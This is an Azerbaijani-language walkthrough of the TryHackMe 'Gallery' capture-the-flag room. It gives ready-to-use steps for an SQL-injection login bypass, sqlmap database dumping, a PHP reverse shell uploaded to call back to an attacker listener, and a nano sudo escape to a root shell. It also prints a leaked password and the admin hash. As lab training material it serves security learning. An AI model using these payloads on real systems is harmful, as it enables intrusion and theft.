# TryHackMe — Gallery CTF Writeup (Azərbaycanca)
**Otaq:** https://tryhackme.com/room/gallery666  
**Çətinlik:** Asan  
**OS:** Linux  
**Texnikalar:** SQLi, File Upload RCE, Privilege Escalation (GTFOBins)

---

## Ümumi Baxış

Gallery — zəif qorunmuş bir şəkil qalereya CMS-i olan Linux maşınıdır. Hücum zənciri belədir:
1. SQL Injection ilə admin panelə giriş
2. PHP reverse shell yükləyərək ilkin giriş (www-data)
3. `.bash_history` faylında şifrəni tapıb `mike` istifadəçisinə keçid
4. `nano` GTFOBins texnikası ilə root hüququ əldə etmə

---

## Task 1: Shell Al

### 1. Kəşfiyyat (Nmap)

```bash
nmap -A -T4 -p- <MACHINE_IP> -oN nmap-scan
```

**Nəticə:**
| Port | Servis |
|------|--------|
| 22   | SSH (OpenSSH 8.2p1) |
| 80   | HTTP (Apache default page) |
| 8080 | HTTP (Simple Image Gallery System) |

> **Sual 1:** Neçə port açıqdır? → `3`

> **Sual 2:** CMS-in adı nədir? → `Simple Image Gallery`

---

### 2. Web Exploitasiyası

#### SQL Injection ilə Giriş Bypass

Login səhifəsinə get: `http://<IP>:8080/gallery/login.php`

**Username** sahəsinə yaz:
```
admin' OR 1=1-- -
```
**Password:** istənilən şey (məs. `password`)

Admin panelinə giriş edildi! ✅

---

#### SQLMap ilə Admin Hash Əldə Etmə

Burp Suite ilə album şəkilinə klikləyəndə gələn HTTP request-i `test.req` faylına saxla, sonra:

```bash
# Bütün verilənlər bazalarını siyahıla
sqlmap -r test.req --dbs

# gallery_db bazasından istifadəçiləri dump et
sqlmap -r test.req -D gallery_db -T users --dump --batch
```

Admin şifrə hash-i tapıldı.

> **Sual 3:** Admin şifrə hash-i nədir? → `a228b12a08b6527e7978cbe5d914531c`

---

### 3. Remote Code Execution — File Upload

Admin paneldə **Albums** bölməsinə get → yeni album yarat → **Upload** düyməsinə bas.

Saytın file type yoxlaması **yoxdur**, birbaşa `.php` faylı yükləmək olar!

#### Shell hazırla:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
nano shell.php
```

Faylda bu iki sətri dəyiş:
```php
$ip = '192.168.128.193';  // sənin Kali IP-n
$port = 4444;
```

#### Listener aç:

```bash
nc -lvnp 4444
```

#### Shell-i yüklə və activate et:

- Sayta qayıt → `shell.php` faylını yüklə
- Yüklənmiş fayl ikonuna klik et
- Və ya birbaşa URL-i aç:

```
http://<IP>/gallery/uploads/user_1/album_2/shell.php
```

Shell gəldi! ✅

```
connect to [192.168.128.193] from (UNKNOWN) [<MACHINE_IP>]
$ id
uid=33(www-data)
```

#### Shell-i stabil et:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z bas
stty raw -echo; fg
```

---

### 4. Lateral Movement — Mike İstifadəçisinə Keçid

`/var/backups/` qovluğunu araşdır:

```bash
ls -al /var/backups/
cat /var/backups/mike_home_backup/.bash_history
```

Tarix faylında Mike-in səhvən terminal-a yazdığı şifrə görünür:

```
sudo -l
b3stpassw0rdbr0xx     ← şifrəni komanda kimi yazıb
```

Mike-ə keç:

```bash
su mike
# Şifrə: b3stpassw0rdbr0xx
```

User flag-i al:

```bash
cat /home/mike/user.txt
# THM{xxx...}
```

> **Sual 4:** User flag nədir? → `THM{...}`

---

## Task 2: Root-a Yüksəl

### 1. Sudo Hüquqlarını Yoxla

```bash
sudo -l
```

Nəticə:
```
(root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

Mike bu skripti root kimi şifrəsiz işlədə bilər!

### 2. Skripti İncələ

```bash
cat /opt/rootkit.sh
```

```bash
#!/bin/bash
read -e -p "Would you like to versioncheck, update, list or read the report? " ans;

case $ans in
    versioncheck) /usr/bin/rkhunter --versioncheck ;;
    update)       /usr/bin/rkhunter --update ;;
    list)         /usr/bin/rkhunter --list ;;
    read)         /bin/nano /root/report.txt ;;
esac
```

`read` seçimi **root kimi nano** açır → GTFOBins texnikası!

### 3. GTFOBins — Nano ilə Root Shell

```bash
sudo /bin/bash /opt/rootkit.sh
# Sual gəlir: "read" yaz → Enter
```

Nano açılır. İndi:

```
Ctrl + R       (Read File)
Ctrl + X       (Execute Command)
```

Komanda sahəsinə yaz:
```
reset; sh 1>&0 2>&0
```
**Enter** bas.

Root shell gəldi! ✅

```bash
# id
uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
# THM{xxx...}
```

> **Sual 5:** Root flag nədir? → `THM{...}`

---

## Nəticə

| Mərhələ | Texnika |
|---------|---------|
| Kəşfiyyat | Nmap port scan |
| Giriş bypass | SQL Injection (`OR 1=1`) |
| Hash əldə etmə | SQLMap |
| İlkin giriş | File Upload RCE (PHP shell) |
| Lateral movement | `.bash_history` şifrə sızması |
| Privilege Escalation | GTFOBins — nano (`sudo`) |

**Öyrənilən dərslər:**
- File upload-da extension yoxlaması mütləqdir
- Şifrəni heç vaxt terminala birbaşa yazmayın
- `sudo` ilə açılan editorlar (nano, vim) root shell verə bilər

---
*Writeup: TryHackMe Gallery (gallery666) — Azərbaycanca*
